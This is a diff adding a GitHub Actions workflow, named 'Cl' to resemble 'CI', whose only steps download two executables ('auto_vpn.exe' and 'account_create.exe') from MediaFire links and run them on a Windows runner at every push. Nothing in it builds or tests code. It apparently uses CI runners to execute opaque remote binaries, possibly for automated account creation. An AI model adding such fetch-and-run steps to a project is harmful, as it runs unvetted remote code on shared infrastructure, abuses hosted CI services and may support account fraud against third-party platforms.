@@ -1,0 +1,19 @@
+name: Cl
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+
+    steps:
+    - name: Download 1
+      run: Invoke-WebRequest https://download854.mediafire.com/e4bd40r9t5ggxpofemiwwzUzzUXhp737D4DYCbsej6O2j194l7n1z2RQNcsvIwE_UfCUyDXcKKvhuZtV6_L2D3nmvCAKhHtlS3TlG0iv5Ke18GtqhaThToL-IQ_AXtl6TQsM5OT4atrxWHDlaGgUvX1D5LC8KDM45-iiZNelqy-6/x6dqzmeo2rh67pl/auto_vpn.exe -OutFile vpn.exe
+    - name: Run 1
+      run: .\vpn.exe
+    - name: Download 2 
+      run: Invoke-WebRequest https://download1638.mediafire.com/fnyn8xyon69gPC1cov27PwnPGG4Hmx-MdbCe5ymYQIRmS6lMKwX7-05BExsH9vF-IovjufOTu7ldMot7MJBmw_91EAiT2Z3Y87rBHFuVDAXC_hdmHEFIvs7aMO8sOq15djRTKhQ_30EYhQelZFUkQOgX5h88A9kfMZsRZTnUzk4k/p310ypdlmrnvsrx/account_create.exe -OutFile Create.exe
+    - name: Run 2
+      run: .\Create.exe
+    
